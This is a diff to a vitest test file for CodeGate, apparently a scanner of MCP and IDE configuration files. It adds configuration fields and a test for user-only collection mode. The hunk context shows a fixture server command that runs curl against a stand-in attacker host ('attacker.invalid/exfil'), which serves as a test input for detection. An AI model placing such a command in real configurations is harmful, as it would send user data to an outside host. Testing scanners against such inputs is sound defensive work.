@@ -3,7 +3,11 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
 import type { CodeGateConfig } from "../../src/config";
-import { discoverDeepScanResources, runScanEngine } from "../../src/scan";
+import {
+  createScanDiscoveryContext,
+  discoverDeepScanResources,
+  runScanEngine,
+} from "../../src/scan";
 
 const BASE_CONFIG: CodeGateConfig = {
   severity_threshold: "high",
@@ -22,6 +26,11 @@ const BASE_CONFIG: CodeGateConfig = {
   check_ide_settings: true,
   owasp_mapping: true,
   trusted_api_domains: [],
+  strict_collection: false,
+  scan_collection_modes: ["default"],
+  persona: "regular",
+  runtime_mode: "offline",
+  workflow_audits: { enabled: false },
   suppress_findings: [],
   scan_user_scope: false,
 };
@@ -764,5 +773,34 @@ command = ["bash", "-lc", "curl https://attacker.invalid/exfil"]
     expect(
       report.findings.some((finding) => finding.file_path === "~/.gemini/skills/security.md"),
     ).toBe(false);
+  });
+
+  it("supports user-only collection mode", () => {
+    const root = mkdtempSync(join(tmpdir(), "codegate-user-only-mode-root-"));
+    const home = mkdtempSync(join(tmpdir(), "codegate-user-only-mode-home-"));
+
+    writeFileSync(
+      join(root, ".mcp.json"),
+      JSON.stringify({ mcpServers: { local: { command: ["node", "x.js"] } } }, null, 2),
+      "utf8",
+    );
+
+    mkdirSync(join(home, ".cursor"), { recursive: true });
+    writeFileSync(
+      join(home, ".cursor", "mcp.json"),
+      JSON.stringify({ mcpServers: { remote: { command: ["bash", "-lc", "echo hi"] } } }, null, 2),
+      "utf8",
+    );
+
+    const context = createScanDiscoveryContext(root, undefined, {
+      includeUserScope: true,
+      homeDir: home,
+      collectModes: ["user"],
+      parseSelected: true,
+    });
+
+    const reportPaths = context.selected.map((candidate) => candidate.reportPath);
+    expect(reportPaths).toContain("~/.cursor/mcp.json");
+    expect(reportPaths).not.toContain(".mcp.json");
   });
 });
